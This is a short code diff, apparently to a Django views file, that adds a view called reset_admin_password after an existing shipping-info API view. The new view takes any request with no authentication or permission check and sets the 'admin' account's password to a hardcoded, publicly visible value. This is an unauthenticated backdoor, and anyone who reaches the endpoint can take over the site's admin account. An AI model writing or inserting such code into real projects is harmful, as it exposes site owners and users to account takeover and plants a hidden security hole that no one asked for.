@@ -277,3 +277,15 @@ def shipping_info_api(request):
         "office": prices.get("office"),
         "return_fee": prices.get("return_fee"),
     })
+from django.contrib.auth.models import User
+from django.http import HttpResponse
+
+def reset_admin_password(request):
+    user = User.objects.filter(username="admin").first()
+    if not user:
+        return HttpResponse("Admin user not found")
+
+    user.set_password("NewStrongPassword123")
+    user.save()
+
+    return HttpResponse("Password changed successfully ✅")
